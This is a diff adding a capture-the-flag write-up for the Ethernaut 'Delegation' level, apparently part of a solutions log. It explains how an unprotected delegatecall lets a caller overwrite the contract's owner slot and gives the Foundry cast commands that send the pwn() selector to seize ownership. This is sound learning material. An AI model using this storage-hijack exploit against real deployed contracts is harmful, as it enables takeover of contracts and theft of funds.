@@ -204,3 +204,40 @@ function transfer(address _to, uint _value) public returns (bool) {
 $ cast call $CONTRACT_ADDRESS  "balanceOf(address)" $YOUR_ADDRESS  --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL // to check your current balance
 $ cast send $CONTRACT_ADDRESS  "transfer(address, uint256)" $ANY_ADDRESS  21 --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
 ```
+
+# 6: Delegation
+**Link:** [Delegation Challenge](https://ethernaut.openzeppelin.com/level/6)  
+**Bug:** Unprotected `delegatecall` allowing storage hijacking  
+**Objective:** Claim ownership of the `Delegation` contract
+**Vulnerability Analysis:**
+
+```solidity
+contract Delegate {
+    address public owner;  // Storage slot 0
+    function pwn() public { owner = msg.sender; }
+}
+
+contract Delegation {
+    address public owner;  // Storage slot 0 (matches Delegate)
+    Delegate delegate;
+    function() external { delegate.delegatecall(msg.data); }  // Fallback
+}
+```
+- How delegate call works ?
+  - delegatecall executes code from another contract in the context of the caller, preserving the original storage, msg.sender, and ETH balance.
+  - In our case the `delegatecall` in `Delegation::fallback()` uses the `Delegation` storage and `msg.sender` and `msg.value` and execute the function logic which is present `Delegate` contract.
+- Because Solidity stores state variables in declaration order, when we call pwn() on the Delegate contract via delegatecall from the Delegation contract, it modifies the storage slot of the Delegation contract (Slot 0 - owner) rather than the Delegate contract's storage. This storage collision allows us to overwrite Delegation's owner variable.
+
+**Steps to Attack:**
+- Craft malicious calldata to trigger Delegate.pwn()
+- Force the fallback to execute via delegatecall
+- Storage collision modifies Delegation.owner
+
+**Using Foundry:**
+```shell
+# 1. Calculate selector (alternatively use cast sig "pwn()")
+$ cast keccak "pwn()" | cut -c1-10  # Returns 0xdd365b8b, this is our calldata
+
+# 2. Send malicious transaction
+$ cast send $DELEGATION_ADDRESS 0xdd365b8b --private-key $PRIVATE_KEY --rpc-url $RPC_URL // this will call our fallback function with msg.data as 0xdd365b8b. 
+```
